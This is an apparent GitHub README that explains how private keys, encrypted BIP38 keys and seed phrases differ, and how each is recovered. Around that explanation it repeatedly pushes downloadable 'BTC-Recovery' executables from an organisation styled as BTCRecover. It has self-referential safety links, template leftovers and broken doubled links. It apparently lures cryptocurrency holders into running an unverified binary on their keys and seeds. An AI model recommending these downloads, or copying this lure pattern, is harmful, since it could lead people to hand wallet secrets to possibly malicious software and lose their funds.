<div align="center">
<img src="assets/banner-article.png" alt="A private key is not a seed phrase">
</div>

# A private key is not a seed phrase

<p align="center">Download BTC Recovery for your platform, then run the search for this case on your own machine.</p>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

A private key controls one address; a seed phrase regenerates a whole wallet. They are not interchangeable, they are not convertible in both directions, and knowing which one you hold decides what can be recovered  -  a key needs no phrase, and a phrase needs no key.

## You'll see this if

You have a string that might be a key, or a phrase you were told was a key, and the two routes have completely different answers.

| What you have | What it is | What it recovers |
|---|---|---|
| A 64-character hex string | a raw private key | the coins at its address |
| A string starting with 5, K or L | an encoded private key | the same, usually without a password |
| A string with a six-character prefix and a passphrase | an encrypted (BIP38) key | the same, after a passphrase search |
| 12 or 24 words | a seed phrase, not a key | an entire wallet |
| Words you were told are a "private key" | a phrase with a misleading label | whatever the phrase restores |
| An address only | neither | nothing  -  an address derives nothing |

## Why it happens

Keys and phrases sit at different levels of the same system. A phrase is the seed from which a tree of keys is derived; a key is one leaf of that tree. Going down the tree is arithmetic and always works; going back up from a leaf to the seed does not, because the derivation is one-way.

That asymmetry is the whole topic. A phrase restores every address the wallet ever used, including the one whose key you might have exported. A key restores exactly one address, forever, with no history beyond it. People who exported a key and later lost the phrase often assume they still hold "the wallet"; they hold one address of it.

Encryption adds a second layer. A raw key is unprotected  -  anyone who sees it owns those coins  -  while an encrypted key needs a passphrase, which can be searched if it was short and remembered in fragments. A key that was never encrypted has nothing to recover; it has something to spend.

## Fix

Identify which artifact you have, then take the matching route: sweep a key, or derive from a phrase. Do not try to convert one into the other.

1. **Classify the string.** Length and prefix distinguish an encoded key from hex from an encrypted key; word count distinguishes a phrase. Do this offline, never in a website field: [Is BTCRecover safe, and how to check a download](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/is-btcrecover-safe.md).
2. **For an unencrypted key, sweep it** into a wallet you control, from an offline machine if the amount is meaningful. A key that has been typed anywhere should be treated as exposed.
3. **For an encrypted key**, search the passphrase locally against the string: [BIP38 encrypted paper wallet recovery](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/decrypt-bip38-paper-wallet-with-btcrecover.md).
4. **For a phrase**, restore it instead  -  the wallet comes back with all its addresses: [How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md).
5. **If you have both**, use the phrase. It supersedes the key and restores the rest of the wallet as well.
6. **Download the current release from the GitHub releases page** when the key is encrypted and the passphrase is partly remembered: [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1).
7. **Record the outcome**: the address, where the key came from, and whether it is now spent. A swept key is a closed chapter.

Compression causes real losses and looks like an empty wallet. The same key can be represented in two forms, compressed and uncompressed, and the two produce different addresses; a key imported in the wrong form shows nothing where you expected a balance, without any error message. If a sweep comes back empty, test the other form before concluding the key is spent or the coins have gone. The string is not the address: the address is what the wallet derived from it, and the derivation has options.

## If that did not work

If a key will not import, the string is usually mistyped or in a format the wallet does not accept  -  compressed versus uncompressed, encoded versus hex, one character lost in transcription.

If an encrypted key resists a serious passphrase search, the transcription is the first suspect and the passphrase the second: a single wrong character fails before any decryption is attempted. Where the passphrase was long and random, nothing recovers it, and the coins at that single address stay unspendable  -  a smaller loss than a whole wallet, but the same kind of loss.

If what you actually need is the rest of the wallet, no key will give it. Keys cannot be assembled into a seed: [Can lost Bitcoin be recovered?](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/can-lost-bitcoin-be-recovered-by-btcrecover.md) explains the boundary, and [Seed phrase storage and the USB-drive question](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/seed-phrase-storage-btcrecover.md) is the page that stops this happening next time.

## Prevention

- Back up the phrase, not the exported keys  -  the phrase covers everything.
- Treat any key that has been typed or photographed as compromised and sweep it.
- Never paste a key into a webpage, a chat or a support form.
- Store keys encrypted if you must store them at all.
- BTCRecover is actively maintained, and the current release is published on the GitHub releases page.

## FAQ

### Can I get my seed phrase from a private key?

No. Derivation runs one way: seed to keys, never key to seed. A key recovers the coins at its own address and gives no information about the rest of the wallet.

### How do I recover Bitcoin with a private key?

Import or sweep the key into a wallet you control, then send the balance to an address you have backed up properly. There is nothing to search unless the key is encrypted with a passphrase.

### Is a private key safer than a seed phrase?

Neither, but their failure modes differ. A key exposes one address and is easy to handle; a phrase exposes everything and is harder to store safely. For long-term holding the phrase plus a tested backup is the more recoverable arrangement.

### How do I know which form of a key I have?

Length and prefix distinguish the common forms, and the wallet reports an error on import rather than a wrong balance for a malformed string. Where two forms are plausible, try both: the wrong one shows an empty address, not a failure.

### I have my private key but lost the passphrase. What now?

If the key is encrypted, the passphrase can be searched when it was short or patterned. If the key is unencrypted, the passphrase is not needed at all and the key alone recovers the coins.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [BIP38 encrypted paper wallet recovery]([BIP38 encrypted paper wallet recovery](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/decrypt-bip38-paper-wallet-with-btcrecover.md))
- [How to recover a seed phrase]([How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md))
- [token lists and password patterns]([Token lists and password patterns](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-token-list-reference.md))
- [wallet.dat password recovery for Bitcoin Core]([wallet.dat password recovery for Bitcoin Core](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/btcrecover-wallet-dat-password-recovery.md))
